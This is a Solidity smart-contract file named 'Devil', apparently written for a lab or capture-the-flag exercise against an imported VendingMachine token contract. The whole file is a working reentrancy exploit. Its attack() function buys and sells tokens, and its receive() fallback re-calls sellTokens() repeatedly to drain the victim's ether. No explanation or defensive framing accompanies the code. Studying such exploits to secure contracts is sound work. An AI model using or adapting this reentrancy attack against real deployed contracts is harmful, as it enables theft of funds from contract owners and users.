// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {SEC} from "./SEC.sol";
import {VendingMachine} from "./VendingMachine.sol";

contract Devil {
    event Counter(uint256);
    VendingMachine public victim;
    SEC public token;
    uint8 counter = 9;

    constructor(address _vendingMachine, address _token) {
        victim = VendingMachine(_vendingMachine);
        token = SEC(_token);
    }

    function attack() external payable {
        victim.buyTokens{value: 10 ether}();

        token.approve(address(victim), 10 * 1e18);

        victim.sellTokens();
    }

    receive() external payable {
        emit Counter(counter);
        bool victimBalance = address(victim).balance >= victim.getPrice();
        bool devilBalance = counter > 0;

        if (victimBalance && devilBalance) {
            counter -= 1;
            victim.sellTokens();
        }
    }
}
